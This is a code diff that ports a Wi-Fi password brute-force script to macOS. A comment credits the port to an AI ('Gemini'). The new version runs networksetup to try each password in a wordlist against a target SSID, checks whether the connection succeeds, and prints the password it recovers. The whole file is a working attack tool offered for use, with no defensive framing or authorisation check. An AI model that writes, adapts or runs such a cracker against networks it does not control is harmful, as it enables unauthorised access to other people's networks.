@@ -1,27 +1,19 @@
-#!/usr/bin/env python 3.7
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 import argparse
 import sys
 import os
-import os.path
 import platform
-import re
 import time
-try:
-    import pywifi
-    from pywifi import PyWiFi
-    from pywifi import const
-    from pywifi import Profile
-except:
-    print("Installing pywifi")
-
+import subprocess
 
 # By Brahim Jarrar ~
 # GITHUB : https://github.com/BrahimJarrar/ ~
 # CopyRight 2019 ~
+# Modified for macOS by Gemini
 
-RED   = "\033[1;31m"  
+RED   = "\033[1;31m"
 BLUE  = "\033[1;34m"
 CYAN  = "\033[1;36m"
 GREEN = "\033[0;32m"
@@ -29,101 +21,97 @@ RESET = "\033[0;0m"
 BOLD    = "\033[;1m"
 REVERSE = "\033[;7m"
 
-try:
-    # wlan
-    wifi = PyWiFi()
-    ifaces = wifi.interfaces()[0]
-
-    ifaces.scan() #check the card
-    results = ifaces.scan_results()
-
-
-    wifi = pywifi.PyWiFi()
-    iface = wifi.interfaces()[0]
-except:
-    print("[-] Error system")
-
-type = False
+WIFI_INTERFACE = "en0"
 
 def main(ssid, password, number):
+    """
+    Tries to connect to a Wi-Fi network using the specified password.
+    """
+    print(f"Trying password [{number}]: {password}")
+    
+    # Command to connect to the Wi-Fi network
+    connect_command = [
+        "networksetup",
+        "-setairportnetwork",
+        WIFI_INTERFACE,
+        ssid,
+        password
+    ]
+    
+    try:
+        # Execute the command to connect. Don't use check=True, we'll check stderr.
+        result = subprocess.run(connect_command, capture_output=True, text=True, timeout=10)
 
-    profile = Profile() 
-    profile.ssid = ssid
-    profile.auth = const.AUTH_ALG_OPEN
-    profile.akm.append(const.AKM_TYPE_WPA2PSK)
-    profile.cipher = const.CIPHER_TYPE_CCMP
+        # On macOS, a wrong password might not cause a non-zero exit code,
+        # but it will print an error to stderr.
+        if result.stderr and ("Failed" in result.stderr or "incorrect" in result.stderr):
+            print(RED, f'[{number}] Crack Failed using {password}')
+            return
 
-
-    profile.key = password
-    iface.remove_all_network_profiles()
-    tmp_profile = iface.add_network_profile(profile)
-    time.sleep(0.1) # if script not working change time to 1 !!!!!!
-    iface.connect(tmp_profile) # trying to Connect
-    time.sleep(0.35) # 1s
-
-    if ifaces.status() == const.IFACE_CONNECTED: # checker
-        time.sleep(1)
-        print(BOLD, GREEN,'[*] Crack success!',RESET)
-        print(BOLD, GREEN,'[*] password is ' + password, RESET)
-        time.sleep(1)
-        exit()
-    else:
-        print(RED, '[{}] Crack Failed using {}'.format(number, password))
+        # If no immediate error, verify the connection by checking the current network.
+        # This is a secondary confirmation.
+        time.sleep(2) # Give time for the connection to establish
+        
+        check_command = ["networksetup", "-getairportnetwork", WIFI_INTERFACE]
+        check_result = subprocess.check_output(check_command, text=True)
+        
+        if f"Current Wi-Fi Network: {ssid}" in check_result:
+            print(BOLD, GREEN, '[*] Crack success!', RESET)
+            print(BOLD, GREEN, '[*] password is ' + password, RESET)
+            exit()
+        else:
+            # This can happen if the command succeeded but association failed silently.
+            print(RED, f'[{number}] Crack Failed using {password}')
+            
+    except subprocess.TimeoutExpired:
+        print(RED, f'[{number}] Crack Failed using {password} (command timed out)')
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 def pwd(ssid, file):
+    """
+    Reads passwords from a file and tries to connect.
+    """
     number = 0
     with open(file, 'r', encoding='utf8') as words:
         for line in words:
             number += 1
-            line = line.split("\n")
-            pwd = line[0]
-            main(ssid, pwd, number)
-                    
-
+            password = line.strip()
+            if password:
+                main(ssid, password, number)
 
 def menu():
-    parser = argparse.ArgumentParser(description='argparse Example')
+    """
+    Parses command-line arguments and starts the cracking process.
+    """
+    if platform.system() != "Darwin":
+        print(RED, "[-] This script is only for macOS.", RESET)
+        sys.exit(1)
 
-    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
-    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')
-
-    group1 = parser.add_mutually_exclusive_group()
-
-    group1.add_argument('-v', '--version', metavar='', help='version')
-    print(" ")
+    parser = argparse.ArgumentParser(description='macOS Wi-Fi Password Cracker')
+    parser.add_argument('-s', '--ssid', type=str, help='SSID of the Wi-Fi network')
+    parser.add_argument('-w', '--wordlist', type=str, help='Path to the wordlist file')
+    parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0 (macOS)')
 
     args = parser.parse_args()
 
-    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
-    time.sleep(2.5)
+    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...", RESET)
+    time.sleep(1)
 
-    if args.wordlist and args.ssid:
+    if args.ssid and args.wordlist:
         ssid = args.ssid
-        filee = args.wordlist
-    elif args.version:
-        print("\n\n",CYAN,"by Brahim Jarrar\n")
-        print(RED, " github", BLUE," : https://github.com/BrahimJarrar/\n")
-        print(GREEN, " CopyRight 2019\n\n")
-        exit()
+        wordlist_file = args.wordlist
     else:
         print(BLUE)
         ssid = input("[*] SSID: ")
-        filee = input("[*] pwds file: : ")
+        wordlist_file = input("[*] Passwords file: ")
 
-
-    # thx
-    if os.path.exists(filee):
-        if platform.system().startswith("Win" or "win"):
-            os.system("cls")
-        else:
-            os.system("clear")
-
-        print(BLUE,"[~] Cracking...")
-        pwd(ssid, filee)
-
+    if os.path.exists(wordlist_file):
+        os.system("clear")
+        print(BLUE, "[~] Cracking...", RESET)
+        pwd(ssid, wordlist_file)
     else:
-        print(RED,"[-] No Such File.",BLUE)
-
+        print(RED, f"[-] Wordlist file not found: {wordlist_file}", RESET)
 
 if __name__ == "__main__":
     menu()
